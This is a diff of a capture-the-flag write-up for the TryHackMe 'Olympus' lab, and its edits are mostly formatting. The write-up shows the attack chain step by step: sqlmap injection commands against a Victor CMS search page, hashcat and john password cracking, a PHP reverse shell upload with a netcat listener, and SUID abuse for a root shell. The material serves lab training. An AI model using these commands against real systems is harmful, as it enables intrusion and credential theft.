@@ -1,8 +1,8 @@
 # Try Hack Me - Olympus
 # Author: Atharva Bordavekar
 # Difficulty: Medium
-# Points: 
-# Vulnerabilities: 
+# Points: 120
+# Vulnerabilities: SQLi, SUID abuse, ssh hash cracking
 
 # Phase 1 - Reconnaissance: 
 nmap scan:
@@ -44,7 +44,7 @@ gobuster dir -u http://olympus.thm -w /usr/share/wordlists/dirb/common.txt
 
 `static               (Status: 301) [Size: 311] [--> http://olympus.thm/static/]`
 
-the most relevant directory for getting the first flag would be the /~webmaster directory. lets manually enumerate it to find anything useful. on visiting the page, i found out that it user a Victor CMS. now on some google dorking, i found out that the search bar is vulnerable to SQL injections. lets fire up some manual SQLis which i found on the exploit.db report. after injecting the search field, the SQLi was confirmed. i will be using sqlmap to automate the enumeration.
+the most relevant directory for getting the first flag would be the `/~webmaster` directory. lets manually enumerate it to find anything useful. on visiting the page, i found out that it user a Victor CMS. now on some google dorking, i found out that the search bar is vulnerable to SQL injections. lets fire up some manual SQLis which i found on the exploit.db report. after injecting the search field, the SQLi was confirmed. i will be using sqlmap to automate the enumeration.
 
 ```bash
 sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --batch
@@ -65,7 +65,7 @@ and just like that, we have found the flag1 for the CTF! we have also found some
 ```bash
 hashcat -m 3200 prometheus.txt /usr/share/wordlists/rockyou.txt 
 ```
-this gives us the password for user prometheus which we can use to get a dashboard. here we find a lot of things like chats, posts, etc. but the most important thing will be the email in the users page. this email is  a possible hint for a possible vhost/subdomain. lets add it in our /etc/hosts file
+this gives us the password for user prometheus which we can use to get a dashboard. here we find a lot of things like chats, posts, etc. but the most important thing will be the email in the users page. this email is  a possible hint for a possible vhost/subdomain. lets add it in our `/etc/hosts` file
 
 ```bash
 echo "<target_ip> chat.olympus.thm" | sudo tee -a /etc/hosts
@@ -95,12 +95,12 @@ gobuster dir -u http://chat.olympus.thm -w /usr/share/wordlists/dirb/common.txt
 
 `uploads              (Status: 301) [Size: 322] [--> http://chat.olympus.thm/uploads/]`
 
-here we can see the /uploads directory, but we still have no idea about the name of the reverseshell which is being stored on the /uploads directory. lets use sqlmap with the --fresh-queries flag to get the exact name of the reverseshell which we uploaded. 
+here we can see the `/uploads` directory, but we still have no idea about the name of the reverseshell which is being stored on the `/uploads` directory. lets use sqlmap with the `--fresh-queries` flag to get the exact name of the reverseshell which we uploaded. 
 
 ```bash
 sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" -D olympus --dump --random-agent -v 3 --batch --fresh-queries
 ```
-as we can see, we have uploaded multiple reverseshells in the process of figuring out a way to trigger the reverseshell. lets access the reverseshell file in the browser at http://chat.olympus.thm/uploads/<reverseshell_name.php>
+as we can see, we have uploaded multiple reverseshells in the process of figuring out a way to trigger the reverseshell. lets access the reverseshell file in the browser at `http://chat.olympus.thm/uploads/<reverseshell_name.php>`
 
 ```bash
 # first setup a netcat listener:
@@ -129,7 +129,7 @@ john id_rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 `NOTE: If you have already cracked it using john but cannot view the hash, use the "john --show id_rsa_hash"" command to view the pot file`
 
-now we have an ssh shell as zeus. now i found an interesting directory in the /var/www/html location which was suspiciously owned by the group which zeus was a part of. we find a .php file named VIGQFQFMYOST.php. 
+now we have an ssh shell as zeus. now i found an interesting directory in the `/var/www/html` location which was suspiciously owned by the group which zeus was a part of. we find a .php file named `VIGQFQFMYOST.php`. 
 
 ```bash
 <?php
@@ -175,13 +175,13 @@ for($x=0;$x<=2;$x++) fclose($pipes[x]);
 proc_close($proc);
 ?>
 ```
-i used Ai to filter through the code and it found out that the code will execute an SUID named /lib/defended/libc.so.99. i executed it just for finding out what it does and we directly got a root shell!
+i used Ai to filter through the code and it found out that the code will execute an SUID named `/lib/defended/libc.so.99`. i executed it just for finding out what it does and we directly got a root shell!
 
 ```bash
 /lib/defended/libc.so.99
 # direct root shell
 ```
-maybe this was an unintended way of getting a shell as root. lets grab the root flag present at /root/root.flag and move on to finding the bonus flag. 
+maybe this was an unintended way of getting a shell as root. lets grab the root flag present at `/root/root.flag` and move on to finding the bonus flag. 
 
 as far as i know that all the flags are having the same format of `flag{....}` . so lets use this to our own advantage and find out all the files on the system which contain this set of string. we will be combining the `find` command with the `grep` command. find will search for all files on the system while grep will check each file which matches our given condition. 
 
@@ -190,9 +190,9 @@ find / -type f -exec grep -l "flag{" {} \;
 ```
 `NOTE: We can speed up this process by using the hint provided by the creator.`
 
-using the hint, we come to know that the file is present in the /etc directory. lets modify our orignal payload to search for all files in the /etc directory.
+using the hint, we come to know that the file is present in the `/etc` directory. lets modify our orignal payload to search for all files in the /etc directory.
 
 ```bash
 find /etc -type f -exec grep -l "flag{" {} \;
 ```
-and just like that we find the final bonus flag which was hidden deep in the /etc directory. we read it and submit the bonus flag.
+and just like that we find the final bonus flag which was hidden deep in the `/etc` directory. we read it and submit the bonus flag.
